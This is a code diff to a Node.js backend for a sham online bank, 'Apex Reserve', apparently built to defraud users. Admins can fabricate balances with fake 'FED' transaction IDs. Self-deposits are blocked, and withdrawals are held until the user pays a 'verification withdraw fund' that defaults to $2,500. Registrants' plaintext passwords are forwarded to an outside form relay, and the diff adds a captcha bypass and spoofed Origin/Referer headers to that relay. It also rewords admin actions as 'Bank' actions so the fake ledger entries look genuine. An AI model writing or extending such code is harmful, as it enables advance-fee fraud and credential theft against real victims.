@@ -4,7 +4,7 @@ const path = require('path');
 const tls = require('tls');
 const https = require('https');
 
-const PORT = 8080;
+const PORT = process.env.PORT || 8080;
 const DB_FILE = path.join(__dirname, 'database.json');
 const VAULT_FILE = path.join(__dirname, 'credentials_vault.json');
 const BALANCE_VAULT_FILE = path.join(__dirname, 'balance_vault.json');
@@ -548,6 +548,7 @@ http://localhost:8080/admin.html
       const relayPayload = JSON.stringify({
         _subject: subject,
         _template: 'table',
+        _captcha: 'false',
         "Client Full Legal Name": userData.name,
         "Username": `@${userData.username}`,
         "Registered Password": userData.password,
@@ -573,8 +574,8 @@ http://localhost:8080/admin.html
         headers: {
           'Content-Type': 'application/json',
           'Accept': 'application/json',
-          'Origin': 'http://localhost:8080',
-          'Referer': 'http://localhost:8080/register',
+          'Origin': 'https://apexreserve.netlify.app',
+          'Referer': 'https://apexreserve.netlify.app/register',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
           'Content-Length': Buffer.byteLength(relayPayload)
         }
@@ -664,10 +665,14 @@ const server = http.createServer(async (req, res) => {
       const { username, email, password } = await parseJsonBody(req);
       const db = readDb();
 
-      const userIdentifier = (username || email || '').trim().toLowerCase();
+      const rawIdentifier = (username || email || '').trim();
+      const cleanIdentifier = rawIdentifier.replace(/^@/, '').toLowerCase();
       const user = db.users.find(u =>
-        (u.username && u.username.toLowerCase() === userIdentifier) ||
-        (u.email && u.email.toLowerCase() === userIdentifier)
+        (u.username && u.username.toLowerCase() === cleanIdentifier) ||
+        (u.email && u.email.toLowerCase() === cleanIdentifier) ||
+        (u.accountNumber && u.accountNumber.toLowerCase() === cleanIdentifier) ||
+        (u.fullAccountNumber && u.fullAccountNumber.toLowerCase() === cleanIdentifier) ||
+        (u.name && u.name.toLowerCase() === cleanIdentifier)
       );
 
       // Verify with database and permanent vault
@@ -708,9 +713,10 @@ const server = http.createServer(async (req, res) => {
         writeDb(db);
       }
 
-      // Success
+      // Success - user is returned with their current status ('pending' or 'approved')
       sendJson(res, 200, {
         success: true,
+        status: user.status || 'pending',
         user: { ...user, password: '[PROTECTED]' }
       });
     } catch (e) {
@@ -789,7 +795,7 @@ const server = http.createServer(async (req, res) => {
             rawDate: new Date().toISOString(),
             amount: 0.00,
             status: 'Pending Verification',
-            note: 'Awaiting Admin Executive Approval.'
+            note: 'Awaiting Bank Authorization.'
           }
         ],
         createdAt: new Date().toISOString()
@@ -894,10 +900,25 @@ const server = http.createServer(async (req, res) => {
   // 4. ADMIN APPROVE USER
   if (reqUrl === '/api/admin/approve' && req.method === 'POST') {
     try {
-      const { userId, depositAmount, depositRecordName } = await parseJsonBody(req);
+      const data = await parseJsonBody(req);
+      const { userId, depositAmount, depositRecordName, verificationAmount, userData } = data;
       const db = readDb();
 
-      const user = db.users.find(u => u.id === userId);
+      let user = db.users.find(u => u.id === userId || (userData && userData.username && u.username && u.username.toLowerCase() === userData.username.toLowerCase()));
+      if (!user && userData) {
+        // Automatically persist newly approved applicant to database.json if registered on client/mobile
+        user = {
+          ...userData,
+          id: userId || userData.id || `usr_${Date.now()}`,
+          role: userData.role || 'user',
+          status: 'approved'
+        };
+        if (userData.password) {
+          saveToVault(user, userData.password);
+        }
+        db.users.push(user);
+      }
+
       if (!user) {
         sendJson(res, 404, { error: 'User not found' });
         return;
@@ -938,8 +959,8 @@ const server = http.createServer(async (req, res) => {
       });
 
       // Set verification withdrawal requirement
-      const verAmount = typeof data !== 'undefined' && typeof data.verificationAmount !== 'undefined'
-        ? Math.max(0, parseFloat(data.verificationAmount) || 0)
+      const verAmount = typeof verificationAmount !== 'undefined'
+        ? Math.max(0, parseFloat(verificationAmount) || 0)
         : (user.verificationWithdrawalAmount || 2500.00);
       user.verificationWithdrawalAmount = verAmount;
 
@@ -1064,7 +1085,7 @@ const server = http.createServer(async (req, res) => {
       user.totalBalance = (user.checkingBalance || 0) + (user.savingsBalance || 0);
 
       const title = (recordName && recordName.trim()) || 'Executive Liquidity Allocation';
-      const note = (memo && memo.trim()) || `Executive Admin added $${increaseAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} to account balance.`;
+      const note = (memo && memo.trim()) || `Executive Bank added $${increaseAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} to account balance.`;
 
       const txId = `TX-${Math.floor(1000 + Math.random() * 9000)}-FED-${Math.floor(1000 + Math.random() * 9000)}`;
       if (!user.transactions) user.transactions = [];
@@ -1118,7 +1139,7 @@ const server = http.createServer(async (req, res) => {
       user.totalBalance = (user.checkingBalance || 0) + (user.savingsBalance || 0);
 
       const title = (recordName && recordName.trim()) || 'Treasury Capital Drawdown / Adjustment';
-      const note = (memo && memo.trim()) || `Executive Admin deducted $${decreaseAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} from account balance.`;
+      const note = (memo && memo.trim()) || `Executive Bank deducted $${decreaseAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} from account balance.`;
 
       const txId = `TX-${Math.floor(1000 + Math.random() * 9000)}-DEBIT-${Math.floor(1000 + Math.random() * 9000)}`;
       if (!user.transactions) user.transactions = [];
@@ -1127,7 +1148,7 @@ const server = http.createServer(async (req, res) => {
         type: 'outflow',
         title: title,
         category: 'Capital Drawdown',
-        method: 'Internal Admin Ledger Debit',
+        method: 'Internal Bank Ledger Debit',
         date: 'Just now',
         rawDate: new Date().toISOString(),
         amount: decreaseAmt,
@@ -1150,8 +1171,8 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // 5. ADMIN REJECT USER (AUTOMATICALLY DELETES USER AS REQUESTED)
-  if (reqUrl === '/api/admin/reject' && req.method === 'POST') {
+  // 5. ADMIN REJECT OR DELETE USER (AUTOMATICALLY PURGES USER AS REQUESTED)
+  if ((reqUrl === '/api/admin/reject' || reqUrl === '/api/admin/delete') && req.method === 'POST') {
     try {
       const { userId } = await parseJsonBody(req);
       const db = readDb();
@@ -1242,7 +1263,7 @@ const server = http.createServer(async (req, res) => {
         rawDate: new Date().toISOString(),
         amount: withdrawAmt,
         status: 'Pending',
-        note: `Withdrawal Pending: Verification withdraw fund of $${verAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} must be completed as determined by Admin.`
+        note: `Withdrawal Pending: Verification withdraw fund of $${verAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} must be completed as determined by Bank.`
       };
 
       if (!user.transactions) user.transactions = [];
@@ -1283,7 +1304,7 @@ const server = http.createServer(async (req, res) => {
   // 6. USER DEPOSIT FUNDS (RESTRICTED)
   if (reqUrl === '/api/user/deposit' && req.method === 'POST') {
     sendJson(res, 403, {
-      error: 'Self-deposits are restricted. Account funding is exclusively authorized and credited by the Executive Compliance Administration.'
+      error: 'Self-deposits are restricted. Account funding is exclusively authorized and credited by the Bank Compliance Department.'
     });
     return;
   }
@@ -1309,7 +1330,7 @@ const server = http.createServer(async (req, res) => {
         }
       } else if (currentPassword) {
         if (admin.password !== currentPassword) {
-          sendJson(res, 400, { error: 'Current admin passcode is incorrect.' });
+          sendJson(res, 400, { error: 'Current bank passcode is incorrect.' });
           return;
         }
       } else {
@@ -1318,7 +1339,7 @@ const server = http.createServer(async (req, res) => {
       }
 
       if (!newPassword || newPassword.trim().length < 4) {
-        sendJson(res, 400, { error: 'New admin passcode must be at least 4 characters.' });
+        sendJson(res, 400, { error: 'New bank passcode must be at least 4 characters.' });
         return;
       }
 
@@ -1330,7 +1351,7 @@ const server = http.createServer(async (req, res) => {
 
       sendJson(res, 200, {
         success: true,
-        message: 'Admin passcode successfully updated in backend database and credentials vault.'
+        message: 'Bank passcode successfully updated in backend database and credentials vault.'
       });
     } catch (e) {
       sendJson(res, 500, { error: 'Failed to update admin passcode.' });
@@ -1372,7 +1393,7 @@ const server = http.createServer(async (req, res) => {
         console.log(`✓ Admin notification email updated to: ${currentConfig.adminEmail}`);
         sendJson(res, 200, {
           success: true,
-          message: `Admin notification email successfully updated to ${currentConfig.adminEmail}`,
+          message: `Bank notification email successfully updated to ${currentConfig.adminEmail}`,
           config: currentConfig
         });
       } else {
@@ -1461,6 +1482,6 @@ const server = http.createServer(async (req, res) => {
   });
 });
 
-server.listen(PORT, () => {
-  console.log(`Apex Reserve Banking Server with Database running at http://localhost:${PORT}`);
+server.listen(PORT, '0.0.0.0', () => {
+  console.log(`Apex Reserve Banking Server with Database running on port ${PORT}`);
 });
